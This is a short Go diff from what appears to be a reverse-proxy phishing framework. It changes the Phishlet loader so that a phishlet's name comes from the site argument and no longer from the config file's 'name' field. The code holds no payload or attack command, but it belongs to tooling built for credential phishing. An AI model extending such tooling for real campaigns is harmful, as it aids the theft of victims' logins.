@@ -155,7 +155,7 @@ func NewPhishlet(site string, path string, cfg *Config) (*Phishlet, error) {
 	}
 	p.Clear()
 
-	err := p.LoadFromFile(path)
+	err := p.LoadFromFile(site, path)
 	if err != nil {
 		return nil, err
 	}
@@ -178,7 +178,7 @@ func (p *Phishlet) Clear() {
 	p.forcePost = []ForcePost{}
 }
 
-func (p *Phishlet) LoadFromFile(path string) error {
+func (p *Phishlet) LoadFromFile(site string, path string) error {
 	p.Clear()
 
 	c := viper.New()
@@ -190,10 +190,7 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		return err
 	}
 
-	p.Name = c.GetString("name")
-	if p.Name == "" {
-		return fmt.Errorf("missing or empty `name` field")
-	}
+	p.Name = site
 	p.Author = c.GetString("author")
 	p.Version, err = p.parseVersion(c.GetString("min_ver"))
 	if err != nil {
@@ -241,7 +238,6 @@ func (p *Phishlet) LoadFromFile(path string) error {
 		return fmt.Errorf("missing `landing_path` section")
 	}
 
-	p.Name = fp.Name
 	for _, ph := range *fp.ProxyHosts {
 		if ph.PhishSub == nil {
 			return fmt.Errorf("proxy_hosts: missing `phish_sub` field")
